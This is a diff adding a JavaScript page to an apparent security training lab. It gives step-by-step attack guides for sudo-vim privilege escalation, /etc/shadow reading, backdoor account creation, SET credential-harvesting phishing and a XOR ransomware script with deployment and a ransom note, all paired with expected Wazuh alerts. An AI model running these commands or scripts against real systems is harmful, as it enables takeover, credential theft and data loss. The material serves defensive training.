+              { cls: 'out-bad', t: '══════════ Sudo version' },
+              { cls: 'out-bad', t: '[!] CVE-2021-3156: sudo baron samedit (heap-based BO)' },
+              { cls: 'out-warn', t: '[+] SUDO vim → GTFObins exploit available' },
+              { cls: 'out-warn', t: '[+] SUID binaries found: /usr/bin/find, /usr/bin/python3' },
+            ],
+            wazuh: { rule: '200', desc: 'Suspicious script execution via curl pipe detected', sev: 'HIGH', rule_name: 'Script Download & Execute' }
+          },
+          {
+            title: 'Exploit SUDO vim → Root',
+            sub: 'Use GTFObins technique to get root shell',
+            num_color: '#00ff88',
+            explain: 'Since vim can run as root without password, use GTFObins to spawn a root shell from inside vim.',
+            commands: [
+              { prompt: 'www-data@ubuntu:~$', cmd: 'sudo vim -c \':!/bin/bash\'', comment: '# Spawn bash as root via vim' },
+              { prompt: 'root@ubuntu:~#', cmd: 'whoami', comment: '# Confirm root access' },
+              { prompt: 'root@ubuntu:~#', cmd: 'cat /etc/shadow', comment: '# Read shadow password file' },
+              { prompt: 'root@ubuntu:~#', cmd: 'useradd -m -s /bin/bash backdoor && echo "backdoor:BackD00r!" | chpasswd', comment: '# Create persistent backdoor' },
+            ],
+            output: [
+              { cls: 'out-good', t: 'root' },
+              { cls: 'out-good', t: 'uid=0(root) gid=0(root) groups=0(root)' },
+              { cls: 'out-bad', t: 'root:$6$random$hashedpassword...' },
+            ],
+            wazuh: { rule: '5403', desc: 'Privilege escalation detected — user changed to root via SUDO abuse', sev: 'CRITICAL', rule_name: 'Privilege Escalation Success' }
+          }
+        ]
+      },
+      {
+        id: 'phishing',
+        name: 'Phishing Attack',
+        cat: 'Phase 2 · Social Engineering',
+        icon: 'fa-fish',
+        color: '#ff8c00',
+        difficulty: 2,
+        mitre: 'T1566',
+        desc: 'Clone a login page and capture victim credentials using SET (Social Engineer Toolkit).',
+        prereqs: ['SET installed on Kali', 'Apache running on Kali', 'Victim can reach Kali IP'],
+        steps: [
+          {
+            title: 'Launch Social Engineer Toolkit',
+            sub: 'Start SET credential harvester',
+            num_color: '#ff8c00',
+            explain: 'SET is built into Kali. It can clone any website and capture credentials entered by victims.',
+            commands: [
+              { prompt: 'root@kali:~#', cmd: 'setoolkit', comment: '# Launch SET' },
+              { prompt: 'SET>', cmd: '1', comment: '# 1 = Social-Engineering Attacks' },
+              { prompt: 'SET>', cmd: '2', comment: '# 2 = Website Attack Vectors' },
+              { prompt: 'SET>', cmd: '3', comment: '# 3 = Credential Harvester' },
+              { prompt: 'SET>', cmd: '2', comment: '# 2 = Site Cloner' },
+            ],
+            output: [
+              { cls: 'out-good', t: '[*] Social-Engineer Toolkit v8.0.3 Public Release' },
+              { cls: '', t: '[*] Please make sure you have root access.' },
+            ],
+            wazuh: null
+          },
+          {
+            title: 'Clone the Target Website',
+            sub: 'Copy a real login page',
+            num_color: '#ff8c00',
+            explain: 'Enter your Kali IP as the harvester address, then enter the URL to clone (e.g., a university login page).',
+            commands: [
+              { prompt: 'SET>', cmd: '192.168.100.10', comment: '# Your Kali IP (where victims will connect)' },
+              { prompt: 'SET>', cmd: 'http://192.168.100.20/login', comment: '# URL to clone' },
+              { prompt: 'root@kali:~#', cmd: 'cat /var/www/html/harvester_*.txt', comment: '# View captured credentials' },
+            ],
+            output: [
+              { cls: 'out-good', t: '[*] Cloning the website: http://192.168.100.20/login' },
+              { cls: 'out-good', t: '[*] Web server is running on port 80' },
+              { cls: 'out-warn', t: '[*] Waiting for victim to connect...' },
+              { cls: 'out-bad', t: '[*] WE GOT A HIT! Printing the output:' },
+              { cls: 'out-bad', t: 'PARAM: username=admin' },
+              { cls: 'out-bad', t: 'PARAM: password=Admin2024!' },
+            ],
+            wazuh: { rule: '90002', desc: 'Web credential harvesting activity detected on internal server', sev: 'HIGH', rule_name: 'Phishing Page Detected' }
+          }
+        ]
+      },
+      {
+        id: 'ransomware',
+        name: 'Ransomware Simulation',
+        cat: 'Phase 4 · Impact',
+        icon: 'fa-lock',
+        color: '#ffd700',
+        difficulty: 3,
+        mitre: 'T1486',
+        desc: 'Simulate ransomware behavior — encrypt files and drop ransom note (educational, reversible).',
+        prereqs: ['Root/SYSTEM access on victim', 'Python3 available on victim', 'Isolated network only'],
+        steps: [
+          {
+            title: 'Create Educational Ransomware Script',
+            sub: 'Write a Python encryption simulator',
+            num_color: '#ffd700',
+            explain: 'This script demonstrates ransomware mechanics. It uses XOR (simple, reversible) — NOT real encryption. Safe for lab use.',
+            commands: [
+              { prompt: 'root@kali:~#', cmd: 'cat > eduransom.py << \'EOF\'', comment: '# Create the script' },
+              { prompt: '>', cmd: 'import os, sys', },
+              { prompt: '>', cmd: 'KEY = 0x42  # XOR key (educational only)', },
+              { prompt: '>', cmd: 'def encrypt_file(path):', },
+              { prompt: '>', cmd: '    with open(path,"rb") as f: data=f.read()', },
+              { prompt: '>', cmd: '    enc = bytes([b^KEY for b in data])', },
+              { prompt: '>', cmd: '    with open(path+".locked","wb") as f: f.write(enc)', },
+              { prompt: '>', cmd: '    os.remove(path)', },
+              { prompt: '>', cmd: 'EOF', },
+            ],
+            output: [
+              { cls: 'out-good', t: 'Script created: eduransom.py' },
+              { cls: 'out-warn', t: '⚠ This is XOR-based (educational). Real ransomware uses AES/RSA.' },
+            ],
+            wazuh: null
+          },
+          {
+            title: 'Deploy & Execute on Victim',
+            sub: 'Transfer script and run on victim system',
+            num_color: '#ffd700',
+            explain: 'Transfer the script to the victim via the existing SSH/Meterpreter session, then execute it.',
+            commands: [
+              { prompt: 'root@kali:~#', cmd: 'scp eduransom.py root@192.168.100.20:/tmp/', comment: '# Upload to victim' },
+              { prompt: 'root@192.168.100.20:~#', cmd: 'python3 /tmp/eduransom.py /home/', comment: '# Run on victim home directory' },
+              { prompt: 'root@192.168.100.20:~#', cmd: 'echo "Files encrypted! Contact attacker@lab.com" > /Desktop/README_DECRYPT.txt' },
+              { prompt: 'root@192.168.100.20:~#', cmd: 'ls /home/victim/', comment: '# See .locked files' },
+            ],
+            output: [
+              { cls: 'out-bad', t: 'Encrypting: /home/victim/documents/report.pdf → report.pdf.locked' },
+              { cls: 'out-bad', t: 'Encrypting: /home/victim/documents/budget.xlsx → budget.xlsx.locked' },
+              { cls: 'out-bad', t: 'Encrypting: /home/victim/pictures/photo.jpg → photo.jpg.locked' },
+              { cls: 'out-bad', t: '[!] 47 files encrypted. Ransom note dropped.' },
+            ],
+            wazuh: { rule: '87401', desc: 'Ransomware behavior: mass file modification with extension change', sev: 'CRITICAL', rule_name: 'Ransomware Activity Detected' }
+          },
+          {
+            title: 'Restore Files (Decrypt)',
+            sub: 'Reverse the encryption — important lab step',
+            num_color: '#ffd700',
+            explain: 'Always decrypt after the demo. XOR encryption with the same key decrypts.',
+            commands: [
+              { prompt: 'root@kali:~#', cmd: 'cat > decrypt.py << \'EOF\'', comment: '# Decryption script' },
+              { prompt: '>', cmd: 'KEY = 0x42' },
+              { prompt: '>', cmd: 'for f in os.listdir(path):' },
+              { prompt: '>', cmd: '    if f.endswith(".locked"): encrypt_file(f)  # XOR = same operation' },
+              { prompt: '>', cmd: 'EOF' },
+              { prompt: 'root@192.168.100.20:~#', cmd: 'python3 decrypt.py /home/', comment: '# RESTORE all files' },
+            ],
+            output: [
+              { cls: 'out-good', t: 'Files restored: 47 files decrypted successfully' },
+              { cls: 'out-good', t: 'Lab environment returned to normal state.' },
+            ],
+            wazuh: null
+          }
+        ]
+      }
+    ];
+
+    let currentAttack = null;
+    let openSteps = new Set();
+
+    /* ─── Render attack selector ─── */
+    function renderSelector() {
+      const sel = document.getElementById('attack-selector');
+      sel.innerHTML = ATTACKS.map(a => `
+    <div class="attack-btn" id="abtn-${a.id}" style="--atk-color:${a.color}"
+         onclick="selectAttack('${a.id}')">
+      <div class="atk-icon" style="background:${a.color}22;color:${a.color}">
+        <i class="fas ${a.icon}"></i>
+      </div>
+      <div>
+        <div class="atk-name">${a.name}</div>
+        <div class="atk-cat">${a.cat}</div>
+      </div>
+      <div class="difficulty" style="margin-left:auto">
+        ${[1, 2, 3].map(n => `<div class="diff-dot" style="background:${n <= a.difficulty ? a.color : 'rgba(255,255,255,0.1)'}"></div>`).join('')}
+      </div>
+    </div>`).join('');
+    }
+
+    /* ─── Select attack ─── */
+    function selectAttack(id) {
+      currentAttack = ATTACKS.find(a => a.id === id);
+      openSteps.clear();
+
+      document.querySelectorAll('.attack-btn').forEach(b => b.classList.remove('active'));
+      document.getElementById('abtn-' + id).classList.add('active');
+
+      renderGuide(currentAttack);
+    }
+
+    /* ─── Render guide ─── */
+    function renderGuide(atk) {
+      const area = document.getElementById('guide-area');
+      const diffStars = [1, 2, 3].map(n => `<div class="diff-dot" style="width:12px;height:12px;background:${n <= atk.difficulty ? atk.color : 'rgba(255,255,255,0.1)'};border-radius:50%"></div>`).join('');
+      const diffLabel = ['', 'Beginner', 'Intermediate', 'Advanced'][atk.difficulty];
+
+      // Reset step done for new attack
+      Object.keys(stepDone).forEach(k => delete stepDone[k]);
+
+      area.innerHTML = `
+  <div class="guide-header">
+    <div class="guide-icon" style="background:${atk.color}22;color:${atk.color}"><i class="fas ${atk.icon}"></i></div>
+    <div style="flex:1">
+      <div class="guide-title">${atk.name}</div>
+      <div class="guide-desc">${atk.desc}</div>
+      <div style="display:flex;gap:16px;margin-top:10px;flex-wrap:wrap">
+        <span class="tag" style="color:${atk.color}"><i class="fas fa-fingerprint"></i> MITRE: ${atk.mitre}</span>
+        <span class="tag">${atk.cat}</span>
+        <div style="display:flex;gap:4px;align-items:center">${diffStars}<span style="font-size:0.75rem;color:var(--text-muted);margin-left:4px">${diffLabel}</span></div>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:8px">
+      <button class="btn btn-primary btn-sm" onclick="goSimulate('${atk.id}')">
+        <i class="fas fa-play"></i> Run Simulation
+      </button>
+      <button class="btn btn-outline btn-sm" onclick="copyAll('${atk.id}')">
+        <i class="fas fa-copy"></i> Copy All Commands
+      </button>
+    </div>
+  </div>
+
+  <!-- Overall progress -->
+  <div class="overall-progress">
+    <span class="op-label">// PROGRESS</span>
+    <div class="op-bar"><div class="op-fill" id="op-fill" style="width:0%"></div></div>
+    <span class="op-score" id="op-score">0/${atk.steps.length} steps</span>
+  </div>
+
+  <div class="warn-box" style="margin-bottom:16px">
+    <i class="fas fa-lock-open"></i>
+    <div>Execute all commands in your <strong>Kali Linux VM terminal only</strong>. Target: <strong style="color:${atk.color}">192.168.100.x</strong>. Never use outside the lab.</div>
+  </div>
+
+  <div class="steps-list">
+    ${atk.steps.map((s, i) => renderStep(s, i, atk)).join('')}
+  </div>`;
+
+      // Auto-open first step
+      setTimeout(() => toggleStep(0), 100);
+    }
+
+    /* ── Scoring ── */
+    const stepDone = {};
+    function getScore() {
+      return Object.keys(stepDone).filter(k => stepDone[k]).length;
+    }
+    function updateOverallProgress(total) {
+      const done = getScore();
+      const pct = total ? Math.round(done / total * 100) : 0;
+      const el = document.getElementById('op-fill');
+      const sc = document.getElementById('op-score');
+      if (el) el.style.width = pct + '%';
+      if (sc) sc.textContent = done + '/' + total + ' steps';
+    }
+
+    /* ── Check typed command ── */
+    function checkCommand(stepIdx, atk) {
+      const input = document.getElementById('iterm-in-' + stepIdx);
+      const typed = input.value.trim();
+      if (!typed) return;
+      const history = document.getElementById('iterm-hist-' + stepIdx);
+      const fb = document.getElementById('iterm-fb-' + stepIdx);
+      const step = atk.steps[stepIdx];
+      const prompt = step.commands[0]?.prompt || 'root@kali:~#';
+
+      // Show typed command in history
+      history.innerHTML += `<div class='iterm-line'><span class='iterm-prompt'>${prompt}</span><span class='iterm-cmd'>${typed}</span></div>`;
+      input.value = '';
+
+      // Normalize for comparison (trim, collapse spaces)
+      const norm = s => s.toLowerCase().replace(/\s+/g, ' ').trim();
+      const validCmds = step.commands.filter(c => c.cmd.trim()).map(c => norm(c.cmd));
+      const isCorrect = validCmds.some(v => norm(typed).includes(v.split(' ')[0]) || norm(typed) === v);
+
+      // Known error patterns
+      const isTypo = typed.length > 0 && !isCorrect;
+
+      // Show output
+      const delay = ms => new Promise(r => setTimeout(r, ms));
+      async function showOutput() {
+        await delay(300);
+        if (isCorrect) {
+          // Show expected output lines
+          if (step.output) {
+            step.output.forEach(o => {
+              const div = document.createElement('span');
+              div.className = 'iterm-out ' + (o.cls === 'out-good' ? 'good' : o.cls === 'out-bad' ? 'err' : o.cls === 'out-warn' ? 'warn' : '');
+              div.textContent = o.t;
+              history.appendChild(div);
+            });
+          }
+          fb.textContent = '✓ Correct! Command executed successfully.';
+          fb.className = 'iterm-feedback show correct';
+          stepDone[stepIdx] = true;
+          const badge = document.getElementById('step-badge-' + stepIdx);
+          if (badge) badge.classList.add('show');
+          updateOverallProgress(currentAttack.steps.length);
+          // Wazuh alert toast?
+          if (step.wazuh) setTimeout(() => Toast.error('Wazuh Alert: ' + step.wazuh.rule_name, step.wazuh.desc), 1200);
+        } else {
+          // Suggest closest match
+          history.innerHTML += `<span class='iterm-out err'>bash: ${typed.split(' ')[0]}: command executed with unexpected args</span>`;
+          fb.className = 'iterm-feedback show wrong';
+          fb.innerHTML = `⚠ Not quite right. Try: <span style='color:var(--cyan)'>${step.commands[0]?.cmd || ''}</span> — or click <b>Hint</b>`;
+        }
+        history.scrollTop = history.scrollHeight;
+      }
+      showOutput();
+    }
+
+    /* ── Hint ── */
+    function showHint(stepIdx, atk) {
+      const step = atk.steps[stepIdx];
+      const fb = document.getElementById('iterm-fb-' + stepIdx);
+      const main = step.commands[0];
+      fb.className = 'iterm-feedback show hint';
+      fb.innerHTML = `💡 Hint: Type → <span style='color:var(--green);cursor:pointer' onclick="pasteHint(${stepIdx},'${(main?.cmd || '').replace(/'/g, "\\'").replace(/"/g, '&quot;')}')"><b>${main?.cmd || ''}</b></span> (click to paste)`;
+    }
+
+    function pasteHint(stepIdx, cmd) {
+      const input = document.getElementById('iterm-in-' + stepIdx);
+      if (input) { input.value = cmd; input.focus(); }
+    }
+
+    /* ── Clear terminal ── */
+    function clearTerm(stepIdx) {
+      const history = document.getElementById('iterm-hist-' + stepIdx);
+      if (history) { history.innerHTML = ''; }
+      const fb = document.getElementById('iterm-fb-' + stepIdx);
+      if (fb) fb.className = 'iterm-feedback';
+    }
+
+    function renderStep(s, i, atk) {
+      const cmdsHtml = s.commands.map(c => `
+    <div class="cmd-line">
+      <span class="cmd-prompt">${c.prompt || ''}</span>
+      <span class="cmd-text">${c.cmd}</span>
+      ${c.comment ? `<span class="cmd-comment">&nbsp;&nbsp;${c.comment}</span>` : ''}
+    </div>`).join('');
+
+      const outHtml = s.output ? s.output.map(o => `<div class="${o.cls}">${o.t}</div>`).join('') : '';
+
+      const wazuhHtml = s.wazuh ? `
+    <div class="wazuh-preview">
+      <div class="wt">⚠ Expected Wazuh Alert:</div>
+      <div class="wazuh-field"><span class="wk">Rule ID:</span><span class="wv">${s.wazuh.rule}</span></div>
+      <div class="wazuh-field"><span class="wk">Rule:</span><span class="wv">${s.wazuh.rule_name}</span></div>
+      <div class="wazuh-field"><span class="wk">Severity:</span><span class="wv">${s.wazuh.sev}</span></div>
+      <div class="wazuh-field"><span class="wk">Message:</span><span class="wv" style="color:var(--text-secondary)">${s.wazuh.desc}</span></div>
+    </div>` : '';
+
+      const firstPrompt = s.commands[0]?.prompt || 'root@kali:~#';
+
+      return `
+  <div class="step-card" id="step-${i}">
+    <div class="step-header" onclick="toggleStep(${i})">
+      <div class="step-num" style="background:${atk.color}22;border:1px solid ${atk.color}44;color:${atk.color}">${i + 1}</div>
+      <div class="step-info">
+        <div class="step-title">${s.title}</div>
+        <div class="step-sub">${s.sub}</div>
+      </div>
+      <span class="step-done-badge" id="step-badge-${i}">✓ DONE</span>
+      <i class="fas fa-chevron-down" style="color:var(--text-muted);transition:var(--transition)" id="chev-${i}"></i>
+    </div>
+    <div class="step-body" id="sbody-${i}">
+      <p class="step-p">${s.explain}</p>
+
+      <!-- Reference commands -->
+      <div class="cmd-block">
+        <div class="cmd-bar">
+          <span><i class="fas fa-book" style="margin-right:6px"></i>Reference Commands</span>
+          <button class="cmd-copy" onclick="copyCommands(${i}, event)"><i class="fas fa-copy"></i> Copy</button>
+        </div>
+        <div class="cmd-lines" id="cmds-${i}">${cmdsHtml}</div>
+      </div>
+
+      ${wazuhHtml}
+
+      <!-- Interactive Terminal -->
+      <div style="font-size:0.8rem;font-weight:700;margin-bottom:8px;display:flex;align-items:center;gap:8px">
+        <i class="fas fa-terminal" style="color:var(--green)"></i>
+        Try It Yourself
+        <span style="font-size:0.7rem;font-weight:400;color:var(--text-muted)">— اكتب الأمر وضغط Enter</span>
+      </div>
+      <div class="iterm-wrap">
+        <div class="iterm-bar">
+          <div class="iterm-bar-left">
+            <div class="iterm-dot" style="background:#ff5f57"></div>
+            <div class="iterm-dot" style="background:#febc2e"></div>
+            <div class="iterm-dot" style="background:#28c840"></div>
+            <span class="iterm-title" style="margin-left:6px">kali@lab ~ interactive terminal</span>
+          </div>
+          <div style="display:flex;gap:6px">
+            <span class="iterm-mode">PRACTICE MODE</span>
+            <button class="iterm-enter-btn" style="font-size:0.65rem" onclick="clearTerm(${i})">CLR</button>
+          </div>
+        </div>
+        <div class="iterm-history" id="iterm-hist-${i}">
+          <span class="iterm-out info">// Step ${i + 1}: ${s.title}</span>
+          <span class="iterm-out">// اكتب الأمر في الأسفل وضغط Enter أو زر Run</span>
+          <span class="iterm-out warn">// للحصول على تلميح: اضغط زر Hint</span>
+        </div>
+        <div class="iterm-input-row">
+          <span class="iterm-prompt-label">${firstPrompt}</span>
+          <input class="iterm-input" id="iterm-in-${i}" type="text"
+            placeholder="اكتب الأمر هنا..."
+            autocomplete="off" spellcheck="false"
+            onkeydown="if(event.key==='Enter') checkCommand(${i}, currentAttack)"/>
+          <button class="iterm-enter-btn" onclick="showHint(${i}, currentAttack)">💡 Hint</button>
+          <button class="iterm-enter-btn" onclick="checkCommand(${i}, currentAttack)"><i class="fas fa-play" style="font-size:0.65rem"></i> Run</button>
+        </div>
+        <div class="iterm-feedback" id="iterm-fb-${i}"></div>
+      </div>
+
+      <div class="exec-real-btn" onclick="openMonitor()" style="margin-top:14px">
+        <i class="fas fa-radar" style="color:var(--orange)"></i>
+        <div>
+          <div style="font-size:0.82rem;font-weight:700">Monitor in Wazuh → Open Monitoring Page</div>
+          <div style="font-size:0.72rem;color:var(--text-muted)">See real-time alerts as you execute these commands</div>
+        </div>
+        <i class="fas fa-external-link" style="color:var(--text-muted);margin-left:auto"></i>
+      </div>
+    </div>
+  </div>`;
+    }
+
+    function toggleStep(i) {
+      const body = document.getElementById('sbody-' + i);
+      const chev = document.getElementById('chev-' + i);
+      const isOpen = openSteps.has(i);
+      if (isOpen) { body.classList.remove('open'); chev.style.transform = ''; openSteps.delete(i); }
+      else { body.classList.add('open'); chev.style.transform = 'rotate(180deg)'; openSteps.add(i); }
+    }
+
+    function copyCommands(stepIdx, e) {
+      e.stopPropagation();
+      const el = document.getElementById('cmds-' + stepIdx);
+      const text = [...el.querySelectorAll('.cmd-text')].map(e => e.textContent).filter(t => t.trim()).join('\n');
+      navigator.clipboard.writeText(text).then(() => Toast.success('Copied!', 'Commands copied to clipboard'));
+    }
+
+    function copyAll(attackId) {
+      const atk = ATTACKS.find(a => a.id === attackId);
+      const text = atk.steps.flatMap(s => s.commands.map(c => c.cmd).filter(c => c.trim())).join('\n');
+      navigator.clipboard.writeText(text).then(() => Toast.success('All Commands Copied', `${atk.name} commands ready to paste`));
+    }
+
+    function goSimulate(id) {
+      window.location.href = 'simulations.html#' + id;
+    }
+
+    function openMonitor() {
+      window.location.href = 'monitoring.html';
+    }
+
+    /* ─── Checklist ─── */
+    function updateChecklist() {
+      const total = 6;
+      const checked = [...document.querySelectorAll('[id^=chk]')].filter(c => c.checked).length;
+      const el = document.getElementById('checklist-status');
+      el.textContent = `${checked}/${total} prerequisites confirmed`;
+      el.style.color = checked === total ? 'var(--green)' : checked >= 4 ? 'var(--orange)' : 'var(--text-muted)';
+      if (checked === total) Toast.success('Lab Ready!', 'All prerequisites confirmed — safe to proceed');
+    }
+
+    function checkAll() {
+      document.querySelectorAll('[id^=chk]').forEach(c => c.checked = true);
+      updateChecklist();
+    }
+
+    /* ─── Init ─── */
+    renderSelector();
+    selectAttack('recon'); // Default: first attack
+  </script>
+</body>
+
+</html>
